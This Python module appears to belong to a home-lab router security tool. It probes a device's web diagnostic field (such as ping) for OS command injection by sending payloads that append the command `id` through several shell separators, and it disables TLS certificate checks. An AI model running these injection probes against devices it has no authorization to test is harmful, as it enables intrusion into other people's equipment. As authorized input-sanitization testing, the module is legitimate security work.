"""Diagnostic-field command-injection probe (input-sanitization test).

Many CPE web configurators expose diagnostic tools (ping / traceroute / DNS
lookup) that shell out to the OS with user-supplied input. This module checks
whether such a field validates its input or passes it straight to a shell.

SCOPE / SAFETY:
    * Authorized use only — run this against your OWN home-lab devices.
    * The ONLY command this module ever tries to run is the harmless `id`.
      There are no destructive payloads: no file writes, no reboots, no
      exfiltration — just enough to prove whether input is sanitized.
    * Read-only intent: we send a few requests and read the responses back.

Like the other stages, a run produces an InjectionResult dataclass and is saved
as JSON under ../artifacts/ via report.save().
"""
from __future__ import annotations

import re
import ssl
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

from . import report

# A benign IP for the baseline request — a normal value the field expects.
BASELINE = "127.0.0.1"

# Harmless injection probes. Each appends `id` via a different shell separator
# so we cover `;`, `&&`, `|`, and `$()`. No payload does anything but run `id`.
PAYLOADS = [
    "127.0.0.1; id",
    "127.0.0.1 && id",
    "127.0.0.1 | id",
    "127.0.0.1 $(id)",
]

# `id` output marker, e.g. "uid=0(root) gid=0(root) groups=0(root)".
UID_RE = re.compile(r"uid=\d+(?:\([^)]*\))?")

_MAXREAD = 1 << 16  # cap response read at 64 KiB


@dataclass
class InjectionResult:
    host: str
    endpoint: str
    parameter: str
    vulnerable: bool = False
    payload_that_worked: str | None = None
    evidence: str | None = None
    tested_payloads: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)


def _insecure_ctx() -> ssl.SSLContext:
    """CPE mgmt pages use self-signed certs — don't fail on them."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _send(url: str, method: str, param: str, value: str,
          timeout: float = 8.0) -> tuple[str | None, str | None]:
    """Send one request with {param: value}. Return (body, error).

    An HTTP error status still carries a body (the injected output may live in
    an error page), so we read and return it instead of treating it as failure.
    """
    ctx = _insecure_ctx() if url.lower().startswith("https") else None
    headers = {"User-Agent": "weaknd/0.1"}
    if method.upper() == "GET":
        sep = "&" if "?" in url else "?"
        full = url + sep + urllib.parse.urlencode({param: value})
        req = urllib.request.Request(full, headers=headers)
    else:
        body = urllib.parse.urlencode({param: value}).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read(_MAXREAD).decode("utf-8", "replace"), None
    except urllib.error.HTTPError as e:
        try:
            return e.read(_MAXREAD).decode("utf-8", "replace"), None
        except Exception:
            return "", f"HTTPError {e.code} (no body)"
    except (urllib.error.URLError, OSError, ValueError) as e:
        return None, f"{type(e).__name__}: {e}"


def _evidence_line(body: str, match: re.Match) -> str:
    """Return the response line that holds the uid= match (trimmed)."""
    hit = match.group(0)
    for line in body.splitlines():
        if hit in line:
            return line.strip()[:200]
    return hit


def probe_command_injection(base_url: str, endpoint_path: str, param_name: str,
                            http_method: str = "POST") -> InjectionResult:
    """Test one diagnostic parameter for OS command injection.

    Flow:
        1. Send a baseline request (normal IP) and record the response.
        2. Try each harmless `id`-appending payload in turn.
        3. If a response contains a uid= pattern the baseline did NOT, that
           payload executed — mark vulnerable, capture evidence, and stop.
    """
    host = urllib.parse.urlparse(base_url).hostname or base_url
    url = base_url.rstrip("/") + "/" + endpoint_path.lstrip("/")
    res = InjectionResult(host=host, endpoint=endpoint_path, parameter=param_name,
                          tested_payloads=list(PAYLOADS))

    # 1) baseline — what a normal, well-formed value returns.
    baseline, err = _send(url, http_method, param_name, BASELINE)
    if err:
        res.notes.append(f"baseline request failed: {err}")
        baseline = ""
    elif UID_RE.search(baseline or ""):
        # The page already echoes uid= with benign input — we can't tell an
        # injection apart from normal output, so refuse to claim a finding.
        res.notes.append("baseline already contains uid= — cannot distinguish "
                         "injection from normal output; aborting")
        return res

    # 2) try each benign payload; stop at the first that yields uid= output.
    for payload in PAYLOADS:
        body, err = _send(url, http_method, param_name, payload)
        if err:
            res.notes.append(f"{payload!r}: {err}")
            continue
        m = UID_RE.search(body or "")
        if m and m.group(0) not in (baseline or ""):
            res.vulnerable = True
            res.payload_that_worked = payload
            res.evidence = _evidence_line(body, m)
            res.notes.append(f"command injection confirmed — {payload!r} ran `id`")
            return res

    if not res.vulnerable:
        res.notes.append("no payload produced uid= output — field appears to "
                         "sanitize/validate input (good)")
    return res


def run(base_url: str, endpoint_path: str, param_name: str,
        http_method: str = "POST", save: bool = True) -> InjectionResult:
    """Probe + persist, mirroring the other stages' report.save() behavior."""
    res = probe_command_injection(base_url, endpoint_path, param_name, http_method)
    if save:
        report.save("inject", res.host, res)
    return res


if __name__ == "__main__":
    # Standalone runner (run from the tool/ dir so package imports resolve):
    #   python -m weaknd.injection_probe 192.168.1.1 \
    #       --endpoint /cgi-bin/ping.cgi --param target --method POST
    import argparse

    ap = argparse.ArgumentParser(description="CPE diagnostic-field command-injection probe "
                                             "(own-device input-sanitization test).")
    ap.add_argument("host", help="device host/IP (own lab device)")
    ap.add_argument("--endpoint", required=True, help="diagnostic endpoint path, e.g. /cgi-bin/ping.cgi")
    ap.add_argument("--param", required=True, help="parameter name carrying the target value")
    ap.add_argument("--method", default="POST", choices=["GET", "POST"])
    ap.add_argument("--scheme", default="http", choices=["http", "https"])
    a = ap.parse_args()

    base = f"{a.scheme}://{a.host}"
    r = run(base, a.endpoint, a.param, a.method)
    print(f"\n=== injection-probe ===")
    print(f"  host:       {r.host}")
    print(f"  endpoint:   {r.endpoint}  (param={r.parameter}, {a.method})")
    print(f"  vulnerable: {'YES' if r.vulnerable else 'no'}")
    if r.vulnerable:
        print(f"  payload:    {r.payload_that_worked}")
        print(f"  evidence:   {r.evidence}")
    for n in r.notes:
        print(f"   - {n}")
